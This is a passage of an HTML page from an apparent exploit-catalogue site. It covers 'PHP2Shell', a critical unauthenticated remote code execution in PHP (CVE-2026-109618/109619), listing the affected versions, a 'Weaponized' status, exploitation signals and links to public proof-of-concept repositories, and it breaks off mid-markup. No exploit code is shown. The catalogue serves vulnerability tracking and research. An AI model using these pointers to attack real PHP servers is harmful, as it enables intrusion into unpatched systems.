@@ -1,0 +1,784 @@
+<!doctype html><html lang=en class="dark scroll-smooth"><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>PHP2Shell — PHP Core Pre-Auth RCE via OOM longjmp and Stale Request State (CVE-2026-109618 / CVE-2026-109619) · PoC Archive</title><meta name=description content="CVE-2026-109618, CVE-2026-109619: proof-of-concept exploit targeting PHP (Apache mod_php and PHP-FPM SAPIs) — Critical severity (CVSS 9.8). Status: Weaponized."><meta name=author content="intelseclab"><meta name=theme-color content="#09090b"><meta name=keywords content="CVE,PoC,exploit,proof of concept,security research,CVE-2026-109618,CVE-2026-109619,PHP (Apache mod_php and PHP-FPM SAPIs),RCE,unauthenticated,PHP,memory-corruption,longjmp,OOM,stale-state,Apache,mod_php,PHP-FPM,heap-grooming,ASLR-bypass"><link rel=canonical href=https://poc.intelseclab.com/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/><meta property="og:title" content="PHP2Shell — PHP Core Pre-Auth RCE via OOM longjmp and Stale Request State (CVE-2026-109618 / CVE-2026-109619) · PoC Archive"><meta property="og:description" content="CVE-2026-109618, CVE-2026-109619: proof-of-concept exploit targeting PHP (Apache mod_php and PHP-FPM SAPIs) — Critical severity (CVSS 9.8). Status: Weaponized."><meta property="og:type" content="article"><meta property="og:url" content="https://poc.intelseclab.com/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/"><meta property="og:site_name" content="PoC Archive"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://poc.intelseclab.com/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name=twitter:image content="https://poc.intelseclab.com/og-image.png"><meta name=twitter:card content="summary_large_image"><meta property="article:published_time" content="2026-11-25T00:00:00Z"><meta property="article:modified_time" content="2026-10-24T00:00:00Z"><meta property="article:tag" content="RCE"><meta property="article:tag" content="unauthenticated"><meta property="article:tag" content="PHP"><meta property="article:tag" content="memory-corruption"><meta property="article:tag" content="longjmp"><meta property="article:tag" content="OOM"><meta property="article:tag" content="stale-state"><meta property="article:tag" content="Apache"><meta property="article:tag" content="mod_php"><meta property="article:tag" content="PHP-FPM"><meta property="article:tag" content="heap-grooming"><meta property="article:tag" content="ASLR-bypass"><meta name=twitter:title content="PHP2Shell — PHP Core Pre-Auth RCE via OOM longjmp and Stale Request State (CVE-2026-109618 / CVE-2026-109619) · PoC Archive"><meta name=twitter:description content="CVE-2026-109618, CVE-2026-109619: proof-of-concept exploit targeting PHP (Apache mod_php and PHP-FPM SAPIs) — Critical severity (CVSS 9.8). Status: Weaponized."><meta name=twitter:site content="@intelseclab"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=language content="en"><meta name=revisit-after content="3 days"><meta name=robots content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><script type=application/ld+json>{"@context":"https://schema.org","@type":"TechArticle","about":{"@type":"Thing","name":"CVE-2026-109618, CVE-2026-109619","sameAs":"https://nvd.nist.gov/vuln/detail/CVE-2026-109618, CVE-2026-109619"},"author":{"@type":"Person","name":"9bie (PoC); PHP Security Team (advisory)"},"dateModified":"2026-10-24","datePublished":"2026-11-25","description":"CVE-2026-109618, CVE-2026-109619: proof-of-concept exploit targeting PHP (Apache mod_php and PHP-FPM SAPIs) — Critical severity (CVSS 9.8). Status: Weaponized.","headline":"PHP2Shell — PHP Core Pre-Auth RCE via OOM longjmp and Stale Request State (CVE-2026-109618 / CVE-2026-109619) · PoC Archive","isPartOf":{"@type":"WebSite","name":"PoC Archive","url":"https://poc.intelseclab.com/"},"keywords":["RCE","unauthenticated","PHP","memory-corruption","longjmp","OOM","stale-state","Apache","mod_php","PHP-FPM","heap-grooming","ASLR-bypass"],"publisher":{"@type":"Organization","name":"intelseclab","url":"https://github.com/intelseclab"},"url":"https://poc.intelseclab.com/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/"}</script><script>(function(){try{var e=localStorage.getItem("theme");e==="light"?document.documentElement.classList.remove("dark"):document.documentElement.classList.add("dark")}catch{}})()</script><script src="https://cdn.tailwindcss.com?plugins=typography"></script><script>tailwind.config={darkMode:"class",theme:{extend:{fontFamily:{sans:["Inter","ui-sans-serif","system-ui","sans-serif"],mono:['"JetBrains Mono"',"ui-monospace","SFMono-Regular","monospace"]},colors:{mono:{bg:"#0b0f12",card:"#12181d",border:"#1e262c",hover:"#182129",muted:"#64748b"},brand:{DEFAULT:"#10b981",dim:"#064e3b",light:"#a7f3d0"}}}}}</script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/syntax.css><style>html.dark body{background-color:#0b0f12}body,body *{transition:background-color .15s ease,border-color .15s ease,color .15s ease}html,body{overflow-x:hidden;max-width:100%}.prose :where(p,li,blockquote,td,th){overflow-wrap:break-word;word-break:break-word}.prose :where(code):not(pre code){overflow-wrap:break-word;word-break:break-word}.prose table th:first-child,.prose table td:first-child{width:1%;white-space:nowrap}.poc-code-body pre{margin:0 !important;padding:.55rem .85rem !important;background:0 0 !important}.poc-code-body .chroma{background:0 0 !important}.poc-code-body table{margin:0 !important;width:100%;border:0}.poc-code-body td{padding:0 !important;border:0 !important}.poc-code-body td:first-child{width:1%;white-space:nowrap}.toc #TableOfContents ul,.toc>nav ul{list-style:none;padding-left:0;margin:0}.toc #TableOfContents li,.toc>nav li{margin-top:.25rem}.toc #TableOfContents li li,.toc>nav li li{padding-left:.75rem}.toc #TableOfContents a,.toc>nav a{color:#71717a;text-decoration:none;font-family:var(--font-mono,"JetBrains Mono",ui-monospace,monospace);font-size:.75rem;transition:color .15s}.toc #TableOfContents a:hover,.toc>nav a:hover{color:#059669}.dark .toc #TableOfContents a,.dark .toc>nav a{color:#a1a1aa}.dark .toc #TableOfContents a:hover,.dark .toc>nav a:hover{color:#34d399}*{scrollbar-width:thin;scrollbar-color:#3f3f46 transparent}html.dark *{scrollbar-color:#1e262c transparent}::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:0 0}::-webkit-scrollbar-thumb{background:#d4d4d8;border-radius:3px}::-webkit-scrollbar-thumb:hover{background:#a1a1aa}html.dark ::-webkit-scrollbar-thumb{background:#1e262c}html.dark ::-webkit-scrollbar-thumb:hover{background:#2a3440}</style><link rel=alternate type=application/rss+xml href=https://poc.intelseclab.com/index.xml title="PoC Archive — all new PoCs"><link rel=icon type=image/svg+xml href=/favicon.svg></head><body class="min-h-screen bg-white text-zinc-900 font-sans antialiased selection:bg-emerald-400/20 selection:text-emerald-900 dark:bg-mono-bg dark:text-zinc-100 dark:selection:text-emerald-200"><header class="sticky top-0 z-40 border-b border-zinc-200/80 bg-white/80 backdrop-blur dark:border-mono-border dark:bg-mono-bg/80"><div class="mx-auto flex w-full max-w-6xl items-center gap-4 px-4 py-3 sm:px-6 lg:px-8"><a href=/ class="flex items-center gap-2 font-mono text-sm font-semibold tracking-tight text-zinc-900 dark:text-zinc-100"><img src=/favicon.svg width=36 height=36 alt="PoC Archive">
+<span>PoC Archive</span></a><nav class="ml-2 hidden items-center gap-1 text-sm sm:flex"><a href=/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100">home</a>
+<a href=/pocs/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100 !text-emerald-600 dark:!text-emerald-400">pocs</a>
+<a href=/watchlist/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100">watchlist</a>
+<a href=/search/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-mono-hover dark:hover:text-zinc-100">search</a></nav><div class="ml-auto hidden items-center gap-3 font-mono text-xs sm:flex"><span class="flex items-center gap-1.5 text-zinc-500 dark:text-zinc-400"><span class="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-500"></span>
+<strong class="font-semibold text-zinc-800 dark:text-zinc-100">856</strong> PoCs
+</span><span class="text-zinc-300 dark:text-zinc-700">|</span>
+<a href="/pocs/?signal=kev" class="font-semibold text-red-600 transition hover:underline dark:text-red-400">136 CISA KEV</a></div><div class="ml-auto flex items-center gap-2 sm:ml-3"><a href=https://poc.intelseclab.com/index.xml target=_blank rel="noopener noreferrer" title="RSS feed of new PoCs" aria-label="RSS feed" class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover"><svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg>
+</a><a href=https://github.com/intelseclab/poc-archive target=_blank rel="noopener noreferrer" class="hidden rounded-md border border-zinc-200 px-3 py-1.5 text-xs font-medium text-zinc-700 transition hover:bg-zinc-100 sm:inline-flex dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover">GitHub
+</a><button type=button id=theme-toggle aria-label="Toggle color theme" class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 focus:outline-none focus-visible:ring-2 focus-visible:ring-zinc-400 dark:border-mono-border dark:text-zinc-300 dark:hover:bg-mono-hover">
+<svg class="hidden h-4 w-4 dark:block" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+<svg class="block h-4 w-4 dark:hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 009 9 9 9 0 11-9-9z"/></svg></button></div></div><nav class="flex items-center gap-1 border-t border-zinc-200 px-4 py-2 text-sm sm:hidden dark:border-mono-border"><a href=/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">home</a>
+<a href=/pocs/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">pocs</a>
+<a href=/watchlist/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">watchlist</a>
+<a href=/search/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">search</a></nav><script>(function(){var e=document.getElementById("theme-toggle");if(!e)return;e.addEventListener("click",function(){var e=document.documentElement,t=e.classList.toggle("dark");try{localStorage.setItem("theme",t?"dark":"light")}catch{}})})()</script></header><main class="mx-auto w-full max-w-6xl px-4 py-8 sm:px-6 lg:px-8"><nav class="mb-4 flex flex-wrap items-center justify-between gap-2 font-mono text-xs"><div class="flex min-w-0 items-center gap-2 text-zinc-500 dark:text-mono-muted"><a href=/pocs/ class="transition hover:text-emerald-600 dark:hover:text-white">pocs</a>
+<span>/</span>
+<a href=/pocs/web/ class="transition hover:text-emerald-600 dark:hover:text-white">web</a>
+<span>/</span>
+<span class="truncate text-emerald-600 dark:text-brand">CVE-2026-109618, CVE-2026-109619</span></div><a href=/pocs/ class="flex shrink-0 items-center gap-1 text-zinc-500 transition hover:text-emerald-600 dark:text-mono-muted dark:hover:text-white"><svg class="h-3.5 w-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+<span class="hidden sm:inline">Back to catalogue</span></a></nav><div class="space-y-4 rounded-lg border border-zinc-200 bg-white p-5 dark:border-mono-border dark:bg-mono-card"><div class="flex flex-wrap items-center justify-between gap-2 font-mono text-xs"><div class="flex flex-wrap items-center gap-2"><span class="rounded border border-emerald-500/30 bg-emerald-500/10 px-2 py-0.5 font-bold text-emerald-600 dark:text-brand">CVE-2026-109618, CVE-2026-109619</span>
+<span class="rounded border border-zinc-200 bg-zinc-50 px-2 py-0.5 text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">category: web</span>
+<span class="rounded border border-zinc-200 bg-zinc-50 px-2 py-0.5 font-bold text-zinc-900 dark:border-mono-border dark:bg-mono-bg dark:text-white">CVSS 9.8 (CRITICAL)
+</span><span class="inline-flex items-center gap-1 rounded border px-2 py-0.5 font-mono text-[11px] uppercase tracking-wide border-red-300 bg-red-50 text-red-600 dark:border-red-800 dark:bg-red-950 dark:text-red-400" title="Listed in the CISA Known Exploited Vulnerabilities catalog — added 2026-10-26">KEV</span>
+<span class="inline-flex items-center gap-1 rounded border px-2 py-0.5 font-mono text-[11px] uppercase tracking-wide border-zinc-300 bg-zinc-50 text-zinc-600 dark:border-zinc-700 dark:bg-zinc-800 dark:text-zinc-400" title="FIRST EPSS — probability of exploitation in the next 30 days">EPSS 45%</span></div><span class="flex items-center gap-1.5 whitespace-nowrap text-[11px] font-medium text-emerald-600 dark:text-brand" title="Fix confirmed via OSV: 00d8bae801541db0d95a698e108bb4b1b273fe6e, 09a9f29a0402bb87bb448cb2e3149ccbec1699c6"><span class="h-2 w-2 rounded-full bg-emerald-500"></span>Patched</span></div><div class=space-y-1><h1 class="text-balance font-mono text-lg font-bold tracking-tight text-zinc-900 sm:text-xl dark:text-white">PHP2Shell — PHP Core Pre-Auth RCE via OOM longjmp and Stale Request State (CVE-2026-109618 / CVE-2026-109619)</h1><p class="font-mono text-xs text-zinc-500 dark:text-mono-muted">Published: <span class="text-zinc-700 dark:text-slate-300">2026-11-25</span> • Researcher: <span class="text-emerald-600 dark:text-brand">9bie (PoC); PHP Security Team (advisory)</span></p></div><div class="grid grid-cols-2 gap-3 border-t border-zinc-200/60 pt-3 font-mono text-xs sm:grid-cols-4 dark:border-mono-border/60"><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Target software</span>
+<span class="block break-words text-zinc-800 dark:text-slate-300">PHP (Apache mod_php and PHP-FPM SAPIs)</span></div><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Affected versions</span>
+<span class="block break-words text-zinc-800 dark:text-slate-300">PHP 7.3.0–8.2.35, 8.3.0–8.3.36, 8.4.0–8.4.27, 8.5.0–8.5.12 (NVD ranges)</span></div><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Status</span>
+<span class="block break-words text-zinc-800 dark:text-slate-300">Weaponized</span></div><div class=min-w-0><span class="block text-[10px] uppercase text-zinc-400 dark:text-mono-muted">Severity</span>
+<span class="block break-words text-zinc-800 dark:text-slate-300">Critical · CVSS 9.8</span></div></div></div><div class="mt-6 grid grid-cols-1 gap-6 lg:grid-cols-4"><div class="min-w-0 space-y-4 lg:col-span-3"><div class=lg:hidden><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><div><div class="flex items-baseline justify-between"><span class="font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-zinc-400">CVSS</span>
+<span class="font-mono text-lg font-semibold text-red-500 dark:text-red-400">9.8<span class="text-xs text-zinc-400 dark:text-zinc-600">/10</span></span></div><div class="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-zinc-200 dark:bg-mono-bg"><div class="h-full rounded-full bg-red-500" style=width:98%></div></div></div><div class="rounded-md border border-red-500/25 bg-red-500/5 p-3"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Exploitation signals</p><div class="mt-2 flex flex-wrap gap-1.5"><span class="inline-flex items-center gap-1 rounded border px-2 py-0.5 font-mono text-[11px] uppercase tracking-wide border-red-300 bg-red-50 text-red-600 dark:border-red-800 dark:bg-red-950 dark:text-red-400" title="Listed in the CISA Known Exploited Vulnerabilities catalog — added 2026-10-26">KEV</span>
+<span class="inline-flex items-center gap-1 rounded border px-2 py-0.5 font-mono text-[11px] uppercase tracking-wide border-zinc-300 bg-zinc-50 text-zinc-600 dark:border-zinc-700 dark:bg-zinc-800 dark:text-zinc-400" title="FIRST EPSS — probability of exploitation in the next 30 days">EPSS 45%</span></div><p class="mt-2 font-mono text-[11px] leading-relaxed text-zinc-600 dark:text-zinc-400">Confirmed exploited in the wild. Added to CISA KEV 2026-10-26. Federal remediation deadline 2026-10-29.</p><p class="mt-1 font-mono text-[11px] text-zinc-500 dark:text-zinc-400">EPSS 45.1% · 99th percentile</p></div><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-300 bg-red-50 text-red-600 dark:border-red-800 dark:bg-red-950 dark:text-red-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">CVE</dt><dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2026-109618, CVE-2026-109619</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/web/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">web</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">PHP (Apache mod_php and PHP-FPM SAPIs)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">PHP 7.3.0–8.2.35, 8.3.0–8.3.36, 8.4.0–8.4.27, 8.5.0–8.5.12 (NVD ranges)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-11-25</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-emerald-600 dark:text-brand" title="Fix confirmed via OSV: 00d8bae801541db0d95a698e108bb4b1b273fe6e, 09a9f29a0402bb87bb448cb2e3149ccbec1699c6">Patched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/rce/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
+<a href=/tags/unauthenticated/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
+<a href=/tags/php/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#PHP</a>
+<a href=/tags/memory-corruption/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#memory-corruption</a>
+<a href=/tags/longjmp/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#longjmp</a>
+<a href=/tags/oom/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#OOM</a>
+<a href=/tags/stale-state/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#stale-state</a>
+<a href=/tags/apache/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Apache</a>
+<a href=/tags/mod_php/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#mod_php</a>
+<a href=/tags/php-fpm/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#PHP-FPM</a>
+<a href=/tags/heap-grooming/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#heap-grooming</a>
+<a href=/tags/aslr-bypass/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ASLR-bypass</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://nvd.nist.gov/vuln/detail/CVE-2026-109618 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2026-109618</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://nvd.nist.gov/vuln/detail/CVE-2026-109619 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2026-109619</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/ target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/rapid7/metasploit-framework/pull/22139 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/rapid7/metasploit-framework/pull/22139</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/9bie/php2shell-bypass-aslr-exp target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/9bie/php2shell-bypass-aslr-exp</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/dinosn/php-cve-2026-10961x-lab-poc target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/dinosn/php-cve-2026-10961x-lab-poc</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://www.cisa.gov/known-exploited-vulnerabilities-catalog target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.cisa.gov/known-exploited-vulnerabilities-catalog</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-mono-border"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 